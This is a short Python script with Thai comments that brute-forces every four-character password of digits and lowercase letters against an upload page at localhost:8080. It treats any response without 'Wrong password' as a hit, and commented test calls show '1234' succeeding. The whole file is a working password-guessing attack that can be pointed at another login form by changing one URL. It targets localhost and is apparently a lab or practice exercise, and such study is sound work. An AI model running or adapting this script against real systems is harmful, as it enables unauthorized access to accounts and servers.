# import library ที่เกี่ยวข้อง
from urllib.request import Request, urlopen

# host name
url = 'http://localhost:8080/upfile.php'
# ค่าที่จะส่ง
post_data = '?action=do_upload&password='

def createPass():
    # กำหนดขอบเขตของการค้นหา
    data = '1234567890abcdefghijklmnopqrstuvwxyz'
    # สร้าง password 4 ตัว
    for a in data:
        for b in data:
            for c in data:
                for d in data:
                    password = a + '' + b + '' + c + '' + d
                    try:
                        # ส่งรหัส
                        res = sendPassword(password)
                    except:
                        # ถ้าเกิด Exception ให้หยุด
                        print('exception')
                        return False
                    if(res):
                        # ถ้า password ถูกต้องให้หยุดการทำงาน
                        print(password + ' : YES')
                        return res
                    else:
                        print(password + ' : NO')

# ส่ง password มา post ตรวจสอบว่าใช่ password นี้ไหม
def sendPassword(password):
    # กำหนดข้อมูลที่จะ post
    link = url + post_data + password
    # ส่ง request
    req = Request(link)
    # รับค่าผลลัพธ์เป็น code html ของหน้าเว็บ
    res = urlopen(req).read().decode('utf-8')
    # ตรวจสอบข้อความหลังจากส่ง password มีคำว่า 'Wrong password' หรือไม่?
    return not res.find('Wrong password') != -1

def test(password):
    if(sendPassword(password)):
        print('YES')
    else:
        print('NO')

createPass()

# ฟังก์ชันสำหรับทดสอบ
# test('')      # NO
# test('0000')  # NO
# test('1234')  # YES